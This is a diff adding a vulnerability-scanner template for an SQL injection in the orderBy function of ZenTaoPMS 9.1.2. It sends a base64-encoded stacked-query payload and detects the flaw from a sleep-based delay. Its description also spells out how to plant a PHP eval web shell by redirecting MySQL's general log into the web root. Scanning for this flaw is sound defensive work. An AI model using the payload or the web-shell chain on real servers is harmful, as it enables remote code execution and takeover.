@@ -1,0 +1,29 @@
+id: zentao-pms-912-sqli
+info:
+  name: ZenTaoPMS 9.1.2 zentao\lib\base\dao\dao.class.php orderBy函数SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    禅道项目管理软件作为国产开源研发项目管理平台，其zentao\lib\base\dao\dao.class.php组件中的orderBy方法存在SQL注入缺陷。该函数在处理limit参数时未实施有效的输入验证机制，导致任意位置调用该函数的代码都可能产生注入风险。
+
+      漏洞利用链包含以下技术步骤：
+      1. 启用全局日志记录：set global general_log='on';
+      2. 重定向日志路径至Web目录：set global general_log_file='/www/zentaopms/module/misc/ext/model/foo.php';
+      3. 执行恶意SQL注入：select '<?php @eval($_POST[1])?>';
+      4. 恢复日志记录状态：set global general_log='off';
+
+  tags: 禅道
+http:
+- raw:
+  - |
+    GET /zentaopms/www/index.php?m=block&f=main&mode=getblockdata&blockid=case&param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2YzY1NjM3NDIwNzM2YzY1NjU3MDI4MzUyOTtQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ== HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=7
+    condition: and
